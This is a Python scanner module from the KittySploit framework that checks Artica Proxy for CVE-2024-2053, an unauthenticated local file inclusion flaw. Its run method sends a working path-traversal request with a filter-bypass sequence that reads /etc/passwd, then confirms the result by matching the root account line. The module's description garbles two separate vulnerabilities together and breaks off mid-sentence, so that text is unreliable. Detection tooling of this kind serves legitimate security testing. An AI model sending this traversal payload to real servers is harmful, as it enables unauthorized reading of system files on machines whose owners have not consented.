#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Artica Proxy administrative web application will deserialize arbitrary PHP objects supplied by unauthentic."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Artica Proxy - Unauthenticated LFI Detection',
        'description': 'The Artica Proxy administrative web application will deserialize arbitrary PHP objects supplied by unauthenticated users and subsequently enable code execution as the "www-data" user. This issue was demonstrated on version 4.50 of the The Artica-Proxy administrative web application attempts to prevent local file inclusion. These protections can be bypassed and arbitrary file requests supplied by unauthenticated users will be returned according to the privileges of the "www-data" user.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'lfi', 'artica-proxy', 'articatech', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/0xMarcio/cve/blob/main/2024/CVE-2024-2053.md#cve-2024-2053',
            'https://seclists.org/fulldisclosure/2024/Mar/11',
            'https://korelogic.com/Resources/Advisories/KL-001-2024-001.txt',
        ],
        'cve': 'CVE-2024-2053',
    }

    def run(self):
        path = '/images.listener.php?uri=1&mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('application/force-download',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Artica Proxy - Unauthenticated LFI detected', path=path)
            return True
        return False

